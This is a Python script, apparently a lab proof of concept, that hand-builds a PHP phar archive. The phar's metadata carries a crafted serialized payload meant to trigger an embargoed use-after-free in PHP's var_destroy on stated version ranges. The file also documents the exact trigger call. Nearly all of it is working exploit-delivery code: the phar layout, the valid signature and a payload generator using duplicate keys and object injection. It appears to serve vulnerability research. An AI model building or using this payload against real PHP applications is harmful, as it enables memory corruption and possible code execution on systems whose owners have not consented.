#!/usr/bin/env python3
"""Build a minimal PHP phar with arbitrary raw serialized metadata.

`Phar::setMetadata()` serializes a normal PHP value, which cannot contain
duplicate array keys — but the var_destroy re-entry payload needs one
(`i:99999;O:...` followed by `i:99999;i:42;`). This builder writes the phar by
hand so the metadata blob is exactly the payload, with a valid MD5 signature.

Lab-only. The phar is a delivery vehicle for the embargoed `var_destroy` UAF
(see docs/VAR_DESTROY_UAF.md). On PHP 8.2.35–8.5.12 the metadata is parsed
lazily: a bare `file_exists('phar://…')` does NOT trigger it, but
`(new Phar($f))->getMetadata()` (without `allowed_classes => false`) does.

Layout (from ext/phar/phar.c):
  stub "<?php __HALT_COMPILER(); ?>"   (manifest starts right after "?>")
  u32 manifest_len          (bytes of manifest, excluding this field)
  manifest:
    u32 count (>=1)
    u16 api_version (0x1100, big-endian)
    u32 flags (0x00010000 = signature present)
    u32 alias_len + alias
    u32 metadata_len + metadata
    per entry: u32 name_len+name, u32 uncompressed, u32 ts, u32 compressed,
               u32 crc32, u32 flags, u32 entry_metadata_len
  file contents
  signature: digest + u32 sig_flags (1=MD5,2=SHA1,3=SHA256,4=SHA512) + "GBMB"

Usage:
  python3 poc/build_uaf_phar.py uaf out.phar        # class T payload
  python3 poc/build_uaf_phar.py hello out.phar      # s:5:"HELLO";
"""
import hashlib
import struct
import sys
import zlib

STUB = b"<?php __HALT_COMPILER(); ?>"
SIG_FIELD = {"md5": 1, "sha1": 2, "sha256": 3, "sha512": 4}


def build(metadata, filename=b"x", content=b"hi", algo="md5",
          with_signature=True):
    flags = 0x00010000 if with_signature else 0
    entry = b""
    entry += struct.pack("<I", len(filename)) + filename
    entry += struct.pack("<I", len(content))
    entry += struct.pack("<I", 0)                   # timestamp
    entry += struct.pack("<I", len(content))        # compressed size
    entry += struct.pack("<I", zlib.crc32(content) & 0xFFFFFFFF)
    entry += struct.pack("<I", 0)                   # entry flags
    entry += struct.pack("<I", 0)                   # entry metadata len

    manifest = struct.pack("<I", 1)                 # at least one entry
    manifest += struct.pack(">H", 0x1100)           # API version (big-endian)
    manifest += struct.pack("<I", flags)
    manifest += struct.pack("<I", 0)                # alias_len
    manifest += struct.pack("<I", len(metadata)) + metadata
    manifest += entry

    out = STUB + struct.pack("<I", len(manifest)) + manifest + content
    if with_signature:
        digest = hashlib.new(algo, out).digest()
        out += digest + struct.pack("<I", SIG_FIELD[algo]) + b"GBMB"
    return out


def uaf_payload(cls="T", n=1016):
    p = ("a:%d:{" % (n + 2)).encode()
    p += b"i:0;N;" * n
    p += ('i:99999;O:%d:"%s":0:{}' % (len(cls), cls)).encode()
    p += b"i:99999;i:42;}"
    return p


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "uaf"
    out = sys.argv[2] if len(sys.argv) > 2 else "uaf.phar"
    if mode == "uaf":
        md = uaf_payload()
    elif mode == "hello":
        md = b's:5:"HELLO";'
    else:
        raise SystemExit("mode: uaf|hello")
    data = build(md)
    with open(out, "wb") as fh:
        fh.write(data)
    print("wrote %s: %d bytes, metadata %d bytes" % (out, len(data), len(md)))
